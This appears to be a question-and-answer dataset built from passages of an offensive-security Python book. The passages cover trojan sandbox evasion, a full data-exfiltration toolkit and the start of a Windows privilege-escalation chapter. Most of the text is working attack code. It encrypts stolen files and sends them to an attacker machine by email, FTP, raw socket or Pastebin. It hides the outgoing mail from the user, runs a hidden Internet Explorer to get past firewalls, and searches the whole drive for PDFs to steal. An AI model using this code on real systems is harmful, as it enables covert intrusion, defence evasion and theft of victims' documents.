c_uint),\n('dwTime', c_ulong)\n]\ndef get_last_input():\nstruct_lastinputinfo = LASTINPUTINFO()\n1\nstruct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO)\nwindll.user32.GetLastInputInfo(byref(struct_lastinputinfo))\n2\nrun_time = windll.kernel32.GetTickCount()\nelapsed = run_time - struct_lastinputinfo.dwTime\nprint(f\"[*] It's been {elapsed} milliseconds since the\nlast event.\")\nreturn elapsed\n3\nwhile True:\nget_last_input()\ntime.sleep(1)\nWe define the necessary imports and create a\nLASTINPUTINFO\nstructure that will hold the timestamp, in milliseconds, of when the\nlast input event was detected on the system. Next, we create a\nfunction, , to determine the last time of input. Do note\nget_last_input\nthat you have to initialize the 1 variable to the size of the\ncbSize\nstructure before making the call. We then call the\nGetLastInputInfo\nfunction, which populates the field with\nstruct_lastinputinfo.dwTime\nthe timestamp. The next step is to determine how long the system\nhas been running by using the 2 function call. The\nGetTickCount\nelapsed time is the amount of time the machine has been running\nminus the time of last input. The last little snippet of code 3 is simple\ntest code that lets you run the script and then move the mouse, or hit\na key on the keyboard, and see this new piece of code in action.\nIt’s worth noting that the total-running system time and the last-\ndetected user input event can vary depending on your particular\nmethod of implantation. For example, if you’ve implanted your\npayload using a phishing tactic, it’s likely that a user had to click a\nlink or perform some other operation to get infected. This means that\nwithin the last minute or two, you’d see user input. But if you see that\nthe machine has been running for 10 minutes and the last detected\ninput was 10 minutes ago, you’re likely inside a sandbox that has not\nprocessed any user input. These judgment calls are all part of having\na good trojan that works consistently.\nYou can use this same technique when polling the system to see\nwhether or not a user is idle, as you may want to start taking\nscreenshots only when they’re actively using the machine. Likewise,\nyou may want to transmit data or perform other tasks only when the\nuser appears to be offline. You could also, for example, track a user\nover time to determine what days and hours they are typically online.\nKeeping this in mind, let’s define three thresholds for how many of\nthese user input values we’ll have to detect before deciding that\nwe’re no longer in a sandbox. Delete the last three lines of test code\nand add some additional code to look at keystrokes and mouse\nclicks. We’ll use a pure solution this time, as opposed to the\nctypes\nPyWinHook method. You can easily use PyWinHook for this purpose\nas well, but having a couple of different tricks in your toolbox always\nhelps, as each antivirus and sandboxing technology has its own way\nof spotting these tricks. Let’s get coding:\nclass Detector:\ndef __init__(self):\nself.double_clicks = 0\nself.keystrokes = 0\nself.mouse_clicks = 0\ndef get_key_press(self):\n1\nfor i in range(0, 0xff):\n2\nstate = win32api.GetAsyncKeyState(i)\nif state & 0x0001:\n3\nif i == 0x1:\nself.mouse_clicks += 1\nreturn time.time()\n4\nelif i > 32 and i < 127:\nself.keystrokes += 1\nreturn None\nWe create a class and initialize the clicks and keystrokes\nDetector\nto zero. The method tells us the number of mouse\nget_key_press\nclicks, the time of the mouse clicks, and how many keystrokes the\ntarget has issued. This works by iterating over the range of valid\ninput keys 1; for each key, we check whether it has been pressed\nusing the 2 function call. If the key’s state shows it\nGetAsyncKeyState\nis pressed ( is truthy), we check if its value is 3,\nstate & 0x0001 0x1\nwhich is the virtual key code for a left-mouse-button click. We\nincrement the total number of mouse clicks and return the current\ntimestamp so that we can perform timing calculations later on. We\nalso check if there are ASCII keypresses on the keyboard 4 and, if\nso, simply increment the total number of keystrokes detected.\nNow let’s combine the results of these functions into our primary\nsandbox detection loop. Add the following method to\nsandbox_detect.py:\ndef detect(self):\nprevious_timestamp = None\nfirst_double_click = None\ndouble_click_threshold = 0.35\n1\nmax_double_clicks = 10\nmax_keystrokes = random.randint(10,25)\nmax_mouse_clicks = random.randint(5,25)\nmax_input_threshold = 30000\n2\nlast_input = get_last_input()\nif last_input >= max_input_threshold:\nsys.exit(0)\ndetection_complete = False\nwhile not detection_complete:\n3\nkeypress_time = self.get_key_press()\nif keypress_time is not None and\nprevious_timestamp is not None:\n4\nelapsed = keypress_time - previous_timestamp\n5\nif elapsed <= double_click_threshold:\nself.mouse_clicks -= 2\nself.double_clicks += 1\nif first_double_click is None:\nfirst_double_click = time.time()\nelse:\n6\nif self.double_clicks >=\nmax_double_clicks:\n7\nif (keypress_time -\nfirst_double_click <=\n(max_double_clicks*double_click_threshold)):\nsys.exit(0)\n8\nif (self.keystrokes >= max_keystrokes and\nself.double_clicks >= max_double_clicks\nand\nself.mouse_clicks >= max_mouse_clicks):\ndetection_complete = True\nprevious_timestamp = keypress_time\nelif keypress_time is not None:\nprevious_timestamp = keypress_time\nif __name__ == '__main__':\nd = Detector()\nd.detect()\nprint('okay.')\nAll right. Be mindful of the indentation in these code blocks! We\nstart by defining some variables 1 to track the timing of mouse clicks\nand three thresholds with regard to how many keystrokes, mouse\nclicks, or double-clicks we’re happy with before considering\nourselves to be running outside a sandbox. We randomize these\nthresholds with each run, but you can of course set thresholds of\nyour own based on your own testing.\nWe then retrieve the elapsed time 2 since some form of user input\nhas been registered on the system, and if we feel that it has been\ntoo long since we’ve seen input (based on how the infection took\nplace, as mentioned previously), we bail out and the trojan dies.\nInstead of dying here, your trojan could perform some innocuous\nactivity such as reading random registry keys or checking files. After\nwe pass this initial check, we move on to our primary keystroke and\nmouse-click-detection loop.\nWe first check for keypresses or mouse clicks 3, knowing that if\nthe function returns a value, it is the timestamp of when the keypress\nor mouse click occurred. Next, we calculate the time elapsed\nbetween mouse clicks 4 and then compare it to our threshold 5 to\ndetermine whether it was a double-click. Along with double-click\ndetection, we’re looking to see if the sandbox operator has been\nstreaming click events 6 into the sandbox to try to fake out sandbox\ndetection techniques. For example, it would be rather odd to see 100\ndouble-clicks in a row during typical computer usage. If the\nmaximum number of double-clicks has been reached and they\nhappened in rapid succession 7, we bail out. Our final step is to see\nif we have made it through all of the checks and reached our\nmaximum number of clicks, keystrokes, and double-clicks 8; if so, we\nbreak out of our sandbox detection function.\nWe encourage you to tweak and play with the settings as well as\nto add additional features, such as virtual machine detection. It might\nbe worthwhile to track typical usage in terms of mouse clicks,\ndouble-clicks, and keystrokes across a few computers that you own\n(we mean ones you actually possess—not ones you have hacked\ninto!) to see where you feel the happy spot is. Depending on your\ntarget, you may want more paranoid settings, or you may not be\nconcerned with sandbox detection at all.\nThe tools you developed in this chapter can act as a base layer of\nfeatures to roll out in your trojan, and because of the modularity of\nour trojaning framework, you can choose to deploy any one of them.",
    "question": "What are the common tasks performed when deploying a trojan on Windows, and how can they be implemented using Python libraries like PyWinHook and pywin32?",
    "summary": "This chapter covers common trojaning tasks on Windows, including keylogging, screenshot capturing, and executing shellcode. It also includes sandbox detection techniques to identify if the trojan is running in an antivirus or forensic sandbox. The keylogger tracks keystrokes and the active window, the screenshot tool captures the entire screen, and the shellcode execution method uses memory to run raw code without touching the filesystem."
  },
  {
    "start": 74,
    "end": 80,
    "text": "9\nFUN WITH EXFILTRATION\nGaining access to a target network is\nonly a part of the battle. To make use of\nyour access, you want to be able to\nexfiltrate documents, spreadsheets, or\nother bits of data from the target\nsystem. Depending on the defense\nmechanisms in place, this last part of your attack can\nprove to be tricky. There might be local or remote\nsystems (or a combination of both) that work to\nvalidate processes that open remote connections as\nwell as determine whether those processes should\nbe able to send information or initiate connections\noutside of the internal network.\nIn this chapter, we’ll create tools that enable you to exfiltrate\nencrypted data. First, we’ll write a script to encrypt and decrypt files.\nWe’ll then use that script to encrypt information and transfer it from\nthe system by using three methods: email, file transfers, and posts to\na web server. For each of these methods, we’ll write both a platform-\nindependent tool and a Windows-only tool.\nFor the Windows-only functions, we’ll rely on the PyWin32 libraries\nwe used in Chapter 8, especially the package. Windows\nwin32com\nCOM (Component Object Model) automation serves a number of\npractical uses—from interacting with network-based services to\nembedding a Microsoft Excel spreadsheet into your own application.\nAll versions of Windows, beginning with XP, allow you to embed an\nInternet Explorer COM object into applications, and we’ll take\nadvantage of this ability in this chapter.\nEncrypting and Decrypting Files\nWe’ll use the package for the encryption tasks. You\npycryptodomex\ncan install it with this command:\n$ pip install pycryptodomex\nNow, open up cryptor.py and let’s import the libraries we’ll need to\nget started:\n1\nfrom Cryptodome.Cipher import AES, PKCS1_OAEP\n2\nfrom Cryptodome.PublicKey import RSA\nfrom Cryptodome.Random import get_random_bytes\nfrom io import BytesIO\nimport base64\nimport zlib\nWe’ll create a hybrid encryption process, using symmetric and\nasymmetric encryption to get the best of both worlds. The AES\ncipher is an example of symmetric encryption 1: it’s called symmetric\nbecause it uses a single key for both encryption and decryption. It is\nvery fast, and it can handle large amounts of text. That’s the\nencryption method we will use to encrypt the information we want to\nexfiltrate.\nWe also import the asymmetric RSA cipher 2, which uses a public\nkey/private key technique. It relies on one key for the encryption\n(typically the public key) and the other for decryption (typically the\nprivate key). We will use this cipher to encrypt the single key used in\nthe AES encryption. The asymmetric encryption is well suited to\nsmall bits of information, making it perfect for encrypting the AES\nkey.\nThis method of using both types of encryption is called a hybrid\nsystem, and it’s very common. For example, the TLS communication\nbetween your browser and a web server involves a hybrid system.\nBefore we can begin encrypting or decrypting, we’ll need to create\npublic and private keys for the asymmetric RSA encryption. That is,\nwe need to create an RSA key generation function. Let’s start by\nadding a function to cryptor.py:\ngenerate\ndef generate():\nnew_key = RSA.generate(2048)\nprivate_key = new_key.exportKey()\npublic_key = new_key.publickey().exportKey()\nwith open('key.pri', 'wb') as f:\nf.write(private_key)\nwith open('key.pub', 'wb') as f:\nf.write(public_key)\nThat’s right—Python is so badass that we can do this in a handful\nof lines of code. This block of code outputs both a private and public\nkey pair in the files named key.pri and key.pub. Now let’s create a\nsmall helper function so we can grab either the public or private key:\ndef get_rsa_cipher(keytype):\nwith open(f'key.{keytype}') as f:\nkey = f.read()\nrsakey = RSA.importKey(key)\nreturn (PKCS1_OAEP.new(rsakey), rsakey.size_in_bytes())\nWe pass this function the key type ( or ), read the\npub pri\ncorresponding file, and return the cipher object and the size of the\nRSA key in bytes.\nNow that we’ve generated two keys and have a function to return\nan RSA cipher from the generated keys, let’s get on with encrypting\nthe data:\ndef encrypt(plaintext):\n1\ncompressed_text = zlib.compress(plaintext)\n2\nsession_key = get_random_bytes(16)\ncipher_aes = AES.new(session_key, AES.MODE_EAX)\n3\nciphertext, tag =\ncipher_aes.encrypt_and_digest(compressed_text)\ncipher_rsa, _ = get_rsa_cipher('pub')\n4\nencrypted_session_key = cipher_rsa.encrypt(session_key)\n5\nmsg_payload = encrypted_session_key + cipher_aes.nonce +\ntag + ciphertext\n6\nencrypted = base64.encodebytes(msg_payload)\nreturn(encrypted)\nWe pass in the plaintext as bytes and compress it 1. We then\ngenerate a random session key to be used in the AES cipher 2 and\nencrypt the compressed plaintext using that cipher 3. Now that the\ninformation is encrypted, we need to pass the session key as part of\nthe returned payload, along with the ciphertext itself, so it can be\ndecrypted on the other side. To add the session key, we encrypt it\nwith the RSA key generated from the generated public key 4. We put\nall the information we need to decrypt into one payload 5, base64-\nencode it, and return the resulting encrypted string 6.\nNow let’s fill out the function:\ndecrypt\ndef decrypt(encrypted):\n1\nencrypted_bytes = BytesIO(base64.decodebytes(encrypted))\ncipher_rsa, keysize_in_bytes = get_rsa_cipher('pri')\n2\nencrypted_session_key =\nencrypted_bytes.read(keysize_in_bytes)\nnonce = encrypted_bytes.read(16)\ntag = encrypted_bytes.read(16)\nciphertext = encrypted_bytes.read()\n3\nsession_key = cipher_rsa.decrypt(encrypted_session_key)\ncipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n4\ndecrypted = cipher_aes.decrypt_and_verify(ciphertext, tag)\n5\nplaintext = zlib.decompress(decrypted)\nreturn plaintext\nTo decrypt, we reverse the steps from the function. First,\nencrypt\nwe base64-decode the string into bytes 1. Then we read the\nencrypted session key, along with the other parameters we need to\ndecrypt, from the encrypted byte string 2. We decrypt the session\nkey using the RSA private key 3 and use that key to decrypt the\nmessage itself with the AES cipher 4. Finally, we decompress it into\na plaintext byte string 5 and return.\nNext, this main block makes it easy to test the functions:\nif __name__ == '__main__':\n1\ngenerate()\nIn one step, we generate the public and private keys 1. We’re\nsimply calling the function since we have to generate the\ngenerate\nkeys before we can use them. Now we can edit the main block to\nuse the keys:\nif __name__ == '__main__':\nplaintext = b'hey there you.'\n1\nprint(decrypt(encrypt(plaintext)))\nAfter the keys are generated, we encrypt and then decrypt a small\nbyte string and then print the result 1.\nEmail Exfiltration\nNow that we can easily encrypt and decrypt information, let’s write\nmethods to exfiltrate the information we’ve encrypted. Open up\nemail_exfil.py, which we’ll use to send the encrypted information via\nemail:\n1\nimport smtplib\nimport time\n2\nimport win32com.client\n3\nsmtp_server = 'smtp.example.com'\nsmtp_port = 587\nsmtp_acct = 'tim@example.com'\nsmtp_password = 'seKret'\ntgt_accts = ['tim@elsewhere.com']\nWe import , which we need for the cross-platform email\nsmptlib\nfunction 1. We’ll use the package to write our Windows-\nwin32com\nspecific function 2. To use the SMTP email client, we need to\nconnect to a Simple Mail Transfer Protocol (SMTP) server (an\nexample might be smtp.gmail.com if you have a Gmail account), so\nwe specify the name of the server, the port on which it accepts\nconnections, the account name, and the account password 3. Next,\nlet’s write our platform-independent function :\nplain_email\ndef plain_email(subject, contents):\n1\nmessage = f'Subject: {subject}\\nFrom {smtp_acct}\\n'\nmessage += f'To: {tgt_accts}\\n\\n{contents.decode()}'\nserver = smtplib.SMTP(smtp_server, smtp_port)\nserver.starttls()\n2\nserver.login(smtp_acct, smtp_password)\n#server.set_debuglevel(1)\n3\nserver.sendmail(smtp_acct, tgt_accts, message)\ntime.sleep(1)\nserver.quit()\nThe function takes and as input and then forms a\nsubject contents\nmessage 1 that incorporates the SMTP server data and message\ncontents. The will be the name of the file that contained the\nsubject\ncontents on the victim machine. The will be the encrypted\ncontents\nstring returned from the function. For added secrecy, you\nencrypt\ncould send an encrypted string as the of the message.\nsubject\nNext, we connect to the server and log in with the account name\nand password 2. Then we invoke the method with our\nsendmail\naccount information, as well as the target accounts to send the mail\nto, and, finally, the message itself 3. If you have any problems with\nthe function, you can set the attribute so you can see the\ndebuglevel\nconnection on your console.\nNow let’s write a Windows-specific function to perform the same\ntechnique:\n1\ndef outlook(subject, contents):\n2\noutlook = win32com.client.Dispatch(\"Outlook.Application\")\nmessage = outlook.CreateItem(0)\n3\nmessage.DeleteAfterSubmit = True\nmessage.Subject = subject\nmessage.Body = contents.decode()\nmessage.To = tgt_accts[0]\n4\nmessage.Send()\nThe function takes the same arguments as the\noutlook\nfunction: and 1. We use the\nplain_email subject contents win32com\npackage to create an instance of the Outlook application 2, making\nsure that the email message is deleted immediately after submitting\n3. This ensures that the user on the compromised machine won’t\nsee the exfiltration email in the Sent Messages and Deleted\nMessages folders. Next, we populate the message subject, body,\nand target email address, and send the email off 4.\nIn the main block, we call the function to complete a\nplain_email\nshort test of the functionality:\nif __name__ == '__main__':\nplain_email('test2 message', 'attack at dawn.')\nAfter you use these functions to send an encrypted file to your\nattacker machine, you’ll open your email client, select the message,\nand copy and paste it into a new file. You can then read from that file\nin order to decrypt it using the function in cryptor.py.\ndecrypt\nFile Transfer Exfiltration\nOpen a new file, transmit_exfil.py, which we’ll use to send our\nencrypted information via file transfer:\nimport ftplib\nimport os\nimport socket\nimport win32file\n1\ndef plain_ftp(docpath, server='192.168.1.203'):\nftp = ftplib.FTP(server)\n2\nftp.login(\"anonymous\", \"anon@example.com\")\n3\nftp.cwd('/pub/')\n4\nftp.storbinary(\"STOR \" + os.path.basename(docpath),\nopen(docpath, \"rb\"), 1024)\nftp.quit()\nWe import , which we’ll use for the platform-independent\nftplib\nfunction, and , for our Windows-specific function.\nwin32file\nWe, the authors, set up our Kali attacker machine to enable the\nFTP server and accept anonymous file uploads. In the\nplain_ftp\nfunction, we pass in the path to a file we want to transfer ( )\ndocpath\nand the IP address of the FTP server (the Kali machine), assigned to\nthe variable 1.\nserver\nUsing the Python makes it easy to create a connection to\nftplib\nthe server, log in 2, and navigate to the target directory 3. Finally, we\nwrite the file to the target directory 4.\nTo create the Windows-specific version, write the\ntransmit\nfunction, which takes the path to the file we want to transfer\n( ):\ndocument_path\ndef transmit(document_path):\nclient = socket.socket()\n1\nclient.connect(('192.168.1.207', 10000))\nwith open(document_path, 'rb') as f:\n2\nwin32file.TransmitFile(\nclient,\nwin32file._get_osfhandle(f.fileno()),\n0, 0, None, 0, b'', b'')\nJust as we did in Chapter 2, we open a socket to a listener on our\nattacker machine using a port of our choosing; here, we use port\n10000 1. Then we use the function to\nwin32file.TransmitFile\ntransfer the file 2.\nThe main block provides a simple test by transmitting a file\n(mysecrets.txt in this case) to the listening machine:\nif __name__ == '__main__':\ntransmit('./mysecrets.txt')\nOnce we’ve received the encrypted file, we can read from that file\nin order to decrypt it.\nExfiltration via a Web Server\nNext, we’ll write a new file, paste_exfil.py, to send our encrypted\ninformation by posting to a web server. We’ll automate the process\nof posting the encrypted document to an account on\nhttps://pastebin.com/. This will enable us to dead-drop the document\nand retrieve it when we want to without anyone else being able to\ndecrypt it. By using a well-known site like Pastebin, we should also\nbe able to bypass any blacklisting that a firewall or proxy may have,\nwhich might otherwise prevent us from just sending the document to\nan IP address or web server that we control. Let’s start by putting\nsome supporting functions into our exfiltration script. Open up\npaste_exfil.py and enter the following code:\n1\nfrom win32com import client\nimport os\nimport random\n2\nimport requests\nimport time\n3\nusername = 'tim'\npassword = 'seKret'\napi_dev_key = 'cd3xxx001xxxx02'\nWe import to handle the platform-independent function2,\nrequests\nand we’ll use ’s class for the Windows-specific\nwin32com client\nfunction1. We’ll authenticate to the https://pastebin.com/ web server\nand upload the encrypted string. In order to authenticate, we define\nthe and and the 3.\nusername password api_dev_key\nNow that we’ve defined our imports and settings, let’s write the\nplatform-independent function :\nplain_paste\n1\ndef plain_paste(title, contents):\nlogin_url = 'https://pastebin.com/api/api_login.php'\n2\nlogin_data = {\n'api_dev_key': api_dev_key,\n'api_user_name': username,\n'api_user_password': password,\n}\nr = requests.post(login_url, data=login_data)\n3\napi_user_key = r.text\n4\npaste_url = 'https://pastebin.com/api/api_post.php'\npaste_data = {\n'api_paste_name': title,\n'api_paste_code': contents.decode(),\n'api_dev_key': api_dev_key,\n'api_user_key': api_user_key,\n'api_option': 'paste',\n'api_paste_private': 0,\n}\n5\nr = requests.post(paste_url, data=paste_data)\nprint(r.status_code)\nprint(r.text)\nLike the preceding email functions, the function\nplain_paste\nreceives the filename for a title and encrypted contents as\narguments 1. You need to make two requests in order to create the\npaste under your own username. First, make a post to the API,\nlogin\nspecifying your , , and 2. The response\nusername api_dev_key password\nfrom that post is your . That bit of data is what you need\napi_user_key\nto create a paste under your own username 3. The second request\nis to the API 4. Send it the name of your paste (the filename is\npost\nour title) and the contents, along with your and API keys 5.\nuser dev\nWhen the function completes, you should be able to log in to your\naccount on https://pastebin.com/ and see your encrypted contents.\nYou can download the paste from your dashboard in order to\ndecrypt.\nNext, we’ll write the Windows-specific technique to perform the\npaste using Internet Explorer. Internet Explorer, you say? Even\nthough other browsers, like Google Chrome, Microsoft Edge, and\nMozilla Firefox are more popular these days, many corporate\nenvironments still use Internet Explorer as their default browser. And\nof course, for many Windows versions, you can’t remove Internet\nExplorer from a Windows system—so this technique should almost\nalways be available to your Windows trojan.\nLet’s see how we can exploit Internet Explorer to help exfiltrate\ninformation from a target network. A fellow Canadian security\nresearcher, Karim Nathoo, pointed out that Internet Explorer COM\nautomation has the wonderful benefit of using the Iexplore.exe\nprocess, which is typically trusted and whitelisted, to exfiltrate\ninformation out of a network. Let’s get started by writing a couple of\nhelper functions:\n1\ndef wait_for_browser(browser):\nwhile browser.ReadyState != 4 and browser.ReadyState !=\n'complete':\ntime.sleep(0.1)\n2\ndef random_sleep():\ntime.sleep(random.randint(5,10))\nThe first of these functions, , ensures that the\nwait_for_browser\nbrowser has finished its events 1, while the second function,\n2, makes the browser act in a somewhat random\nrandom_sleep\nmanner so it doesn’t look like programmed behavior. It sleeps for a\nrandom period of time; this is designed to allow the browser to\nexecute tasks that might not register events with the Document\nObject Model (DOM) to signal that they are complete. It also makes\nthe browser appear to be a bit more human.\nNow that we have these helper functions, let’s add the logic to\ndeal with logging in and navigating the Pastebin dashboard.\nUnfortunately, there is no quick and easy way of finding UI elements\non the web (the authors simply spent 30 minutes using Firefox and\nits developer tools to inspect each HTML element that we needed to\ninteract with). If you wish to use a different service, then you, too, will\nhave to figure out the precise timing, DOM interactions, and HTML\nelements that are required—luckily, Python makes the automation\npiece very easy. Let’s add some more code:\ndef login(ie):\n1\nfull_doc = ie.Document.all\nfor elem in full_doc:\n2\nif elem.id == 'loginform-username':\nelem.setAttribute('value', username)\nelif elem.id == 'loginform-password':\nelem.setAttribute('value', password)\nrandom_sleep()\nif ie.Document.forms[0].id == 'w0':\nie.document.forms[0].submit()\nwait_for_browser(ie)\nThe function begins by retrieving all elements in the DOM 1.\nlogin\nIt looks for the username and password fields 2 and sets them to the\ncredentials we provide (don’t forget to sign up for an account). After\nthis code executes, you should be logged in to the Pastebin\ndashboard and ready to paste some information. Let’s add that code\nnow:\ndef submit(ie, title, contents):\nfull_doc = ie.Document.all\nfor elem in full_doc:\nif elem.id == 'postform-name':\nelem.setAttribute('value', title)\nelif elem.id == 'postform-text':\nelem.setAttribute('value', contents)\nif ie.Document.forms[0].id == 'w0':\nie.document.forms[0].submit()\nrandom_sleep()\nwait_for_browser(ie)\nNone of this code should look very new at this point. We’re simply\nhunting through the DOM to find where to post the title and body of\nthe blog posting. The function receives an instance of the\nsubmit\nbrowser, as well as the filename and encrypted file contents to post.\nNow that we can log in and post to Pastebin, let’s put the finishing\ntouches in place for our script:\ndef ie_paste(title, contents):\n1\nie = client.Dispatch('InternetExplorer.Application')\n2\nie.Visible = 1\nie.Navigate('https://pastebin.com/login')\nwait_for_browser(ie)\nlogin(ie)\nie.Navigate('https://pastebin.com/')\nwait_for_browser(ie)\nsubmit(ie, title, contents.decode())\n3\nie.Quit()\nif __name__ == '__main__':\nie_paste('title', 'contents')\nThe function is what we’ll call for every document we\nie_paste\nwant to store on Pastebin. It first creates a new instance of the\nInternet Explorer COM object 1. The neat thing is that you can set\nthe process to be visible or not 2. For debugging, leave it set to ,\n1\nbut for maximum stealth, you definitely want to set it to . This is\n0\nreally useful if, for example, your trojan detects other activity going\non; in that case, you can start exfiltrating documents, which might\nhelp to further blend in your activities with those of the user. After we\ncall all of our helper functions, we simply kill our Internet Explorer\ninstance 3 and return.\nPutting It All Together\nFinally, we tie our exfiltration methods together with exfil.py, which\nwe can call to exfiltrate files by using any of the methods we’ve just\nwritten:\n1\nfrom cryptor import encrypt, decrypt\nfrom email_exfil import outlook, plain_email\nfrom transmit_exfil import plain_ftp, transmit\nfrom paste_exfil import ie_paste, plain_paste\nimport os\n2\nEXFIL = {\n'outlook': outlook,\n'plain_email': plain_email,\n'plain_ftp': plain_ftp,\n'transmit': transmit,\n'ie_paste': ie_paste,\n'plain_paste': plain_paste,\n}\nFirst, import the modules and functions you just wrote 1. Then,\ncreate a dictionary called whose values correspond to the\nEXFIL\nimported functions 2. This will make calling the different exfiltration\nfunctions very easy. The values are the names of the functions,\nbecause, in Python, functions are first-class citizens and can be\nused as parameters. This technique is sometimes called dictionary\ndispatch. It works much like a case statement in other languages.\nNow we need to create a function that will find the documents we\nwant to exfiltrate:\ndef find_docs(doc_type='.pdf'):\n1\nfor parent, _, filenames in os.walk('c:\\\\'):\nfor filename in filenames:\nif filename.endswith(doc_type):\ndocument_path = os.path.join(parent,\nfilename)\n2\nyield document_path\nThe generator walks the entire filesystem checking for\nfind_docs\nPDF documents 1. When it finds one, it returns the full path and\nyields back execution to the caller 2.\nNext, we create the main function to orchestrate the exfiltration:\n1\ndef exfiltrate(document_path, method):\n2\nif method in ['transmit', 'plain_ftp']:\nfilename = f'c:\\\\windows\\\\temp\\\\\n{os.path.basename(document_path)}'\nwith open(document_path, 'rb') as f0:\ncontents = f0.read()\nwith open(filename, 'wb') as f1:\nf1.write(encrypt(contents))\n3\nEXFIL[method](filename)\nos.unlink(filename)\nelse:\n4\nwith open(document_path, 'rb') as f:\ncontents = f.read()\ntitle = os.path.basename(document_path)\ncontents = encrypt(contents)\n5\nEXFIL[method](title, contents)\nWe pass the function the path to a document and the\nexfiltrate\nmethod of exfiltration we want to use 1. When the method involves a\nfile transfer ( or ), we need to provide an actual\ntransmit plain_ftp\nfile, not an encoded string. In that case, we read in the file from its\nsource, encrypt the contents, and write a new file into a temporary\ndirectory 2. We call the dictionary to dispatch the\nEXFIL\ncorresponding method, passing in the new encrypted document path\nto exfiltrate the file 3 and then remove the file from the temporary\ndirectory.\nFor the other methods, we don’t need to write a new file; instead,\nwe need only to read the file to be exfiltrated 4, encrypt its contents,\nand call the dictionary to email or paste the encrypted\nEXFIL\ninformation 5.\nIn the main block, we iterate over all of the found documents. As a\ntest, we exfiltrate them via the method, although you\nplain_paste\ncan choose any of the six functions we defined:\nif __name__ == '__main__':\nfor fpath in find_docs():\nexfiltrate(fpath, 'plain_paste')\nKicking the Tires\nThere are a lot of moving parts to this code, but the tool is quite easy\nto use. Simply run your exfil.py script from a host and wait for it to\nindicate that it has successfully exfiltrated files via email, FTP, or\nPastebin.\nIf you left Internet Explorer visible while running the\nfunction, you should have been able to watch\npaste_exfile.ie_paste\nthe whole process. After it’s complete, you should be able to browse\nto your Pastebin page and see something like Figure 9-1.\nFigure 9-1: Exfiltrated and encrypted data on Pastebin\nPerfect! Our exfil.py script picked up a PDF document called\ntopo_post.pdf, encrypted the contents, and uploaded the contents to\npastebin.com. We can successfully decrypt the file by downloading\nthe paste and feeding it to the decryption function, as follows:\nfrom cryptor import decrypt\n1\nwith open('topo_post_pdf.txt', 'rb') as f:\ncontents = f.read()\nwith open('newtopo.pdf', 'wb') as f:\n2\nf.write(decrypt(contents))\nThis snippet of code opens the downloaded paste file 1, decrypts\nthe contents, and writes the decrypted contents as a new file 2. You\ncan then open the new file with a PDF reader to view the\ntopographic map that contains the original, decrypted map from the\nvictim machine.\nYou now have several tools for exfiltration in your toolbox. Which\none you select will depend on the nature of your victim’s network and\nthe level of security used on that network.",
    "question": "What are the methods described in the text for exfiltrating encrypted data from a target system, and how do they utilize a combination of symmetric and asymmetric encryption?",
    "summary": "This text explains how to exfiltrate encrypted data from a target network using various methods like email, file transfer, and web servers. It covers the process of generating RSA keys, using symmetric and asymmetric encryption, and creating tools for each exfiltration method. The final step is to combine these methods into a single script that can be used to exfiltrate files from a target system."
  },
  {
    "start": 81,
    "end": 89,
    "text": "10\nWINDOWS PRIVILEGE ESCALATION\nSo you’ve popped a box inside a nice,\njuicy Windows network. Maybe you\nleveraged a remote heap overflow, or\nyou phished your way in. It’s time to\nstart looking for ways to escalate\nprivileges.\nEven if you’re already operating as SYSTEM or Administrator, you\nprobably want several ways of achieving those privileges, in case a\npatch cycle kills your access. It can also be important to have a\ncatalog of privilege escalations in your back pocket, as some\nenterprises run software that may be difficult to analyze in your own\nenvironment, and you may not run into that software until you’re in\nan enterprise of the same size or composition.\nIn a typical privilege escalation, you’d exploit a poorly coded driver\nor native Windows kernel issue, but if you use a low-quality exploit or\nthere’s a problem during exploitation, you run the risk of causing\nsystem instability. Let’s explore some other means of acquiring\nelevated privileges on Windows. System administrators in large\nenterprises commonly schedule tasks or services that execute child\nprocesses, or run VBScript or PowerShell scripts to automate\nactivities. Vendors, too, often have automated, built-in tasks that\nbehave the same way. We’ll try to take advantage of any high-\nprivilege processes that handle files or execute binaries that are\nwritable by low-privilege users. There are countless ways for you to\ntry to escalate privileges on Windows, and we’ll cover only a few.\nHowever, when you understand these core concepts, you can\nexpand your scripts to begin exploring other dark, musty corners of\nyour Windows targets.\nWe’ll start by learning how to apply Windows Management\nInstrumentation (WMI) programming to create a flexible interface that\nmonitors the creation of new processes. We’ll harvest useful data\nsuch as the filepaths, the user who created the process, and enabled\nprivileges. Then we’ll hand off all filepaths to a file-monitoring script\nthat continuously keeps track of any new files created, as well as\nwhat gets written to them. This tells us which files the high-privilege\nprocesses are accessing. Finally, we’ll intercept the file-creation\nprocess by injecting our own scripting code into the file and make the\nhigh-privilege process execute a command shell. The beauty of this\nwhole process is that it doesn’t involve any API hooking, so we can\nfly under most antivirus software’s radar.\nInstalling the Prerequisites\nWe need to install a few libraries to write the tooling in this chapter.\nExecute the following in a cmd.exe shell on Windows:\nC:\\Users\\tim\\work> pip install pywin32 wmi pyinstaller\nYou may have installed when you made your\npyinstaller\nkeylogger and screenshot-taker in Chapter 8, but if not, install it now\n(you can use ). Next, we’ll create the sample service we’ll use to\npip\ntest our monitoring scripts.\nCreating the Vulnerable BlackHat Service\nThe service we’re creating emulates a set of vulnerabilities\ncommonly found in large enterprise networks. We’ll be attacking it\nlater in this chapter. This service will periodically copy a script to a\ntemporary directory and execute it from that directory. Open\nbhservice.py to get started:\nimport os\nimport servicemanager\nimport shutil\nimport subprocess\nimport sys\nimport win32event\nimport win32service\nimport win32serviceutil\nSRCDIR = 'C:\\\\Users\\\\tim\\\\work'\nTGTDIR = 'C:\\\\Windows\\\\TEMP'\nHere, we do our imports, set the source directory for the script file,\nand then set the target directory where the service will run it. Now,\nwe’ll create the actual service using a class:\nclass BHServerSvc(win32serviceutil.ServiceFramework):\n_svc_name_ = \"BlackHatService\"\n_svc_display_name_ = \"Black Hat Service\"\n_svc_description_ = (\"Executes VBScripts at regular\nintervals.\" +\n\" What could possibly go wrong?\")\n1\ndef __init__(self,args):\nself.vbs = os.path.join(TGTDIR, 'bhservice_task.vbs')\nself.timeout = 1000 * 60\nwin32serviceutil.ServiceFramework.__init__(self,\nargs)\nself.hWaitStop = win32event.CreateEvent(None, 0, 0,\nNone)\n2\ndef SvcStop(self):\nself.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)\nwin32event.SetEvent(self.hWaitStop)\n3\ndef SvcDoRun(self):\nself.ReportServiceStatus(win32service.SERVICE_RUNNING)\nself.main()\nThis class is a skeleton of what any service must provide. It\ninherits from the and defines\nwin32serviceutil.ServiceFramework\nthree methods. In the method, we initialize the framework,\n__init__\ndefine 